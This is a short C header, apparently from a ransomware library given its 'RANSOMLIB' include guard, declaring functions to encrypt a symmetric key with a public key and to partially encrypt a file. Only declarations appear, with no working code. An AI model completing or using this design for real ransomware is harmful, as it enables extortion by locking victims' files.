/*
	Contains higher-level cryptographical functions
	(as opposed to crypt.h)
*/
#ifndef RANSOMLIB_HEADER
	#define RANSOMLIB_HEADER 1
	int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* key);
	void partialEncryptFile(const char* key, const char* filename, const unsigned int bytes);
#endif